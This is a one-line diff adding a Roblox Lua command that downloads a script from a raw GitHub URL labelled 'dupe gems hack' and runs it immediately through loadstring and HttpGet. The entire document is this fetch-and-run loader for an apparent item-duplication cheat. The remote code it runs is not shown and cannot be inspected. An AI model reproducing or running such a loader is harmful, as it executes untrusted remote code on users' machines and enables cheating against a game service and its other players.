@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MaSKaThGod/Dupe-gems/main/dupe%20gems%20hack.txt"))()
